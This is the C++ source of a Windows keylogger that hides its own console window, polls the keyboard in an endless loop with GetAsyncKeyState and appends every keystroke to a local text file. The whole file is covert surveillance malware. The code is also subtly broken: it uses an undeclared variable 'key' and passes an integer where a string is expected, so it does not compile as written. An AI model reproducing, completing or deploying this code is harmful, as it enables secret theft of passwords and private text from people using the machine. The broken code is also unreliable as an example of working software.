#include<iostream>
#include<fstream>
#include<windows.h>
#include<bits/stdc++.h>

using namespace std;

// log filw path
#define LOG_FILE "keylogger.txt"

// save data in log file
void saveData(string data){
    fstream logfile;

    //open file
    //ios::app for append to the file instead of overwriting
    logfile.open(LOG_FILE,ios::app);

    // write data to the logfile
    logfile<<data;

    // close the stream
    logfile.close();
}

//translate special key into string
string translateScript(int key){
    string result;

    switch(key)
    {
        case VK_SPACE://space key
            result=" ";
            break;

        case VK_RETURN:
            result="\n";
            break;

        case VK_BACK:
            result="\b";
            break;

        case VK_CAPITAL:
            result="[CAPS_LOCK]";
            break;

        case VK_SHIFT:
            result="[SHIFT]";
            break;

        case VK_TAB:
            result="[TAB]";
            break;

        case VK_CONTROL:
            result="[CTRL]";
            break;

        case VK_MENU:
            result="[ALT]";
            break;
    }
    return result;
}

int main(){

    int specialKeyArr[]={VK_MENU, VK_CONTROL, VK_TAB, VK_SHIFT, VK_BACK, VK_CAPITAL, VK_SPACE, VK_RETURN};
    string specialKeyChar;
    bool isSpecialKey;

    /* Stop recording
     taskkill /F /IM keylogger.exe
    */
    //Hide terminal window
    HWND hwnd=GetConsoleWindow();
    ShowWindow(hwnd,SW_HIDE);

    while(true) // loop forever
    {
        for(int i=8;i<=190;i++) //loop through each key
        {
            if(GetAsyncKeyState(key)==-32767) //check key pressed
            {   //pressed
                isSpecialKey=find(begin(specialKeyArr),end(specialKeyArr),key)!=end(specialKeyArr);
                if(isSpecialKey)
                {
                    specialKeyChar=translateScript(key);
                    saveData(key); //save data to the file
                }
                else
                { //ordinary
                    if(GetKeyState(VK_CAPITAL))//capslock is on
                        saveData(string(1,(char)key));
                    else
                        saveData(string(1,(char)tolower(key)));
                }
            }
        }
    }
    return 0;
}
